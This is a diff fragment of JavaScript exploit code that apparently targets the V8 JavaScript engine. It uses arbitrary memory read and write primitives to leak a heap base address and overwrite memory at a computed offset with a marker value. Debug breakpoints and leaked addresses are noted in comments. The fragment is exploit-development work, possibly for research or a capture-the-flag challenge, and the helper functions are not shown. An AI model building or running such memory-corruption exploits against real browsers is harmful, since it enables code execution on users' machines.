@@ -34,11 +34,25 @@ let u8arr = new Uint8Array(buf);
 // heap_base
 let ofs1 = 0x48;
 let leak_addr = v8_read64(ofs1);
-console.log("addr[", ofs1.toString(16), "] = ", leak_addr.toString(16));
-// addr[ 48 ] =  236500040000
+let ofs2 = leak_addr & 0xffffffffn;
+let ofs3 = leak_addr & 0xffffffff00000000n;
+let leak_addr2 = ofs3 + 0x48n;
+console.log("addr[0x" + ofs1.toString(16) + "] = 0x" + leak_addr.toString(16));
+console.log("ofs2: ", ofs2.toString(16));
+console.log("ofs2 value: ", v8_read64(ofs2).toString(16));
+console.log("before writing to addr: 0x"+ leak_addr.toString(16));
+// 0x35b200000048
+
+// %SystemBreak();
+
+v8_write64(ofs2, 0x4141414142424242n);
+console.log("after writing to addr: 0x"+ leak_addr.toString(16));
+// %SystemBreak();
+// Write to the page starting at 0x3c032d4c0000 
+// addr[ 48 ] =  291e00040000
 
 // %DebugPrint(u8arr);
-%SystemBreak();
+
 
 // v8_write64(addrOf(u8arr)+4, 0x414141414141n);
 // %SystemBreak();
